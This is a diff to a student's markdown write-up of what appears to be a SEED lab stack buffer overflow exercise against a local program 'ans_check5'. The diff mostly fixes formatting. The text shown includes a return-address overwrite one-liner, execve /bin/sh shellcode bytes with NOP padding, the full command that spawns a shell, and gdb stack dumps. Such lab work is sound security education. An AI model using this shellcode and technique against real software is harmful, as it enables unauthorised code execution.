@@ -54,7 +54,8 @@ Segmentation fault
 ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
 ```
 
-  + Result. * As you can notice, the program exit with special input parameter overwriting the return address 
++ Result. 
+   + As you can notice, the program exit with special input parameter overwriting the return address 
 ```
 [02/10/22]seed@VM:Byeongchan$ ans_check5
 Usage: ans_check5 <answer>
@@ -81,20 +82,19 @@ ans_buf is at address 0xbf97bbdc
 Shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 Safe padding: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
 BUFFER_START_ADDRESS: \x6c\xfd\xff\xbf
-``
+```
 
 + Step5. Place the payload as a parameter of the 'ans_check5'.
 
   + FIRST, I executed on command line and I got another bash shell!!!!
+  + SECOND, using gdb, investigate the content of the stack!!
+  + I can see the corrupted stack content filled with the malicious code and \x90s and return address which points to the malicious code!!
 ```
 [02/10/22]seed@VM:Byeongchan$ env -i PWD="/home/seed/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/stack_addresses/ans_check5 $( python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90'*24 + '\x6c\xfd\xff\xbf'")
 ans_buf is at address 0xbffffd6c
 $ exit
 [02/10/22]seed@VM:Byeongchan$
 ```
- 
-  + SECOND, using gdb, investigate the content of the stack!!
-  + I can see the corrupted stack content filled with the malicious code and \x90s and return address which points to the malicious code!!
 ```
 (gdb) x/32xw $esp
 0xbffffd50:	0xbffffd6c	0xbfffff6a	0xbffffd70	0x080482c7
